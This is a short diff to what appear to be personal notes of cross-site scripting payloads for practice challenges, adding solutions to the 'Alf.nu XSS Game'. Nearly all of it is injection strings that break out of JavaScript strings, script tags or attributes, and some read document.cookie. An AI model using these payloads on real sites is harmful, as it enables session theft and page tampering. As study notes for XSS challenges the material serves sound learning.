@@ -52,3 +52,10 @@ onerror=alert(1) <- adding an element with false link and generating alert in er
 3. " onfocus="alert(document['cookie'])                        // context -> within html tags ( input box placeholder )
 4. " onfocus="console.log(document['cookie'])
 5. 
+
+-------------------------------------------------------------------------------------
+[+] Alf.nu XSS Game 
+1. "); alert(1,"                                         // context -> javascript
+2. </script><script>alert(1)//                           // context -> js
+3. </script><script>alert(1)//                           // context -> js
+4. 
